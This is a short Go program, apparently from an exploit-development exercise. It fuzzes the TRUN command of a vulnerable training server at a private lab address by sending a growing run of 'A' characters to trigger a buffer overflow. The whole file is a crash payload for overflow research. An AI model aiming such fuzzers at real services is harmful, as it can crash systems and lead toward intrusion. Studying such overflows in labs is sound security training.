package main

import (
    "fmt"
    "net"
    "strings" //Gives me ability to repeat a string
    "os"      //Gives me ability to use command line args
    "strconv" //Needed to convert args from string to int
 )
 
 func main() {
 
    fmt.Println("[*] Connecting to Target")
    
    conn, err := net.Dial("tcp", "192.168.56.101:9999")
    if err != nil {
        fmt.Println("[!] There was an error connecting")
        fmt.Println("=====================================")
        fmt.Println(err)
        return
    }
    
    arg := os.Args[1]
    intArg, _ := strconv.Atoi(arg) //atoi stands for "ASCII to Integer"
    fuzz := strings.Repeat("A", intArg) 
    payload := "TRUN ." + fuzz
    
    fmt.Fprintf(conn, payload)
    conn.Close()
    
 
 }
